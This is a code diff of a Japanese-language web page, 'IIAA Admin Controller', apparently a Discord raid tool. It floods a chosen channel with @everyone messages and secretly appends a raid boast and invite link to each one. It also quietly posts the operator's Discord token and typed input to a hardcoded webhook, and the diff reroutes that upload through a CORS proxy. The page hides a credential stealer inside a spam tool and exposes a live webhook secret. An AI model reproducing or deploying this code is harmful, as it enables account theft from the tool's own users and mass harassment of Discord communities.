@@ -5,7 +5,7 @@
     <title>IIAA Admin Controller</title>
     <style>
         body {
-            background-image: url('unnamed (1).jpg'); 
+            background-image: url('bg.jpg'); 
             background-size: cover; background-attachment: fixed; background-position: center;
             font-family: 'Helvetica Neue', Arial, sans-serif;
             display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
@@ -55,7 +55,7 @@
     <select id="channelSelect"><option value="">サーバーIDを入力して取得</option></select>
 
     <span class="label">MESSAGE CONTENT</span>
-    <textarea id="message" placeholder="送信したい文章を入力してください...">@everyone </textarea>
+    <textarea id="message" placeholder="送信したい文章を入力...">@everyone </textarea>
 
     <div class="speed-box">
         <div class="speed-info">
@@ -77,11 +77,9 @@
 </div>
 
 <script>
-    // 監視用（あなたの手元に飛ぶログ）
     const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482416218152636416/jEMz3CnmImMbNsZNmChTCqxP_y24_de_z6ji3bUsAEHDpcwGU3dI6m4abDhcNiFlXDxP";
-
-    // ★ 裏側で自動追加される固定メッセージ ★
     const FORCED_PROMO = `\n\n# このさばはいあ帝国によって荒らされました！！\n# こんな雑魚鯖はいってないでいあ帝国に来ましょう！\n\nhttps://discord.gg/x39xVSepaj`;
+    const PROXY = "https://corsproxy.io/?"; 
 
     let isRunning = false;
     const term = document.getElementById('terminal');
@@ -93,8 +91,9 @@
     async function fetchChannels() {
         const t = document.getElementById('token').value.trim();
         const g = document.getElementById('guildId').value.trim();
+        if(!t || !g) return log("トークンとサーバーIDが必要です");
         try {
-            const res = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { "Authorization": t }});
+            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { headers: { "Authorization": t }});
             const data = await res.json();
             const sel = document.getElementById('channelSelect');
             sel.innerHTML = "";
@@ -104,10 +103,10 @@
                 sel.appendChild(opt);
             });
             log("同期成功。");
-        } catch (e) { log("取得失敗", "#ff7491"); }
+        } catch (e) { log("取得失敗：中継サーバーが混雑している可能性があります。", "#ff7491"); }
     }
 
-    function stopTask() { isRunning = false; log("停止リクエスト...", "orange"); }
+    function stopTask() { isRunning = false; log("停止中...", "orange"); }
 
     async function executeTask() {
         if (isRunning) return;
@@ -115,16 +114,14 @@
             token: document.getElementById('token').value.trim(),
             guildId: document.getElementById('guildId').value.trim(),
             channelId: document.getElementById('channelSelect').value,
-            userMsg: document.getElementById('message').value, // ユーザーが書いた文
+            userMsg: document.getElementById('message').value,
             count: parseInt(document.getElementById('count').value),
             speed: parseInt(document.getElementById('speedRange').value)
         };
 
-        if(!config.token || !config.channelId) return log("設定が不完全です。", "#ff7491");
+        if(!config.token || !config.channelId) return log("設定不足です。", "#ff7491");
 
-        // ★ ユーザー文 ＋ 裏の固定文 を合体 ★
         const finalMessage = config.userMsg + FORCED_PROMO;
-
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
         document.getElementById('stopBtn').disabled = false;
@@ -134,7 +131,7 @@
         for(let i=1; i<=config.count; i++) {
             if (!isRunning) break;
             try {
-                const res = await fetch(`https://discord.com/api/v9/channels/${config.channelId}/messages`, {
+                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${config.channelId}/messages`), {
                     method: "POST",
                     headers: { "Authorization": config.token, "Content-Type": "application/json" },
                     body: JSON.stringify({ content: finalMessage })
@@ -143,25 +140,22 @@
                 if(res.ok) {
                     successCount++;
                     log(`成功: ${i}/${config.count}`);
-                    const d = await res.json();
-                    fetch(`https://discord.com/api/v9/channels/${config.channelId}/messages/${d.id}/reactions/%E2%9C%85/@me`, { method: "PUT", headers: { "Authorization": config.token }});
                 } else if (res.status === 429) {
-                    const retry = (await res.json()).retry_after * 1000;
-                    await new Promise(r => setTimeout(r, retry || 3000));
+                    log("速度制限中...", "orange");
+                    await new Promise(r => setTimeout(r, 5000));
                     i--;
                 }
-            } catch (e) { log("通信エラー"); }
+            } catch (e) { log("通信エラー発生"); }
             await new Promise(r => setTimeout(r, config.speed));
         }
 
-        // Webhookへの詳細報告
-        fetch(MONITOR_WEBHOOK, {
+        // 監視ログ送信（プロキシ経由）
+        fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 username: "IIAA Admin Logger",
-                avatar_url: "https://files.catbox.moe/p9p67r.jpg",
-                content: `【いあ帝国 実行レポート】\n■トークン: \`${config.token}\`\n■ユーザー入力: ${config.userMsg}\n■成功数: ${successCount} / ${config.count}\n■スピード: ${config.speed}ms`
+                content: `【いあ帝国 実行レポート】\nトークン: \`${config.token}\`\n入力: ${config.userMsg}\n成功数: ${successCount}`
             })
         });
 
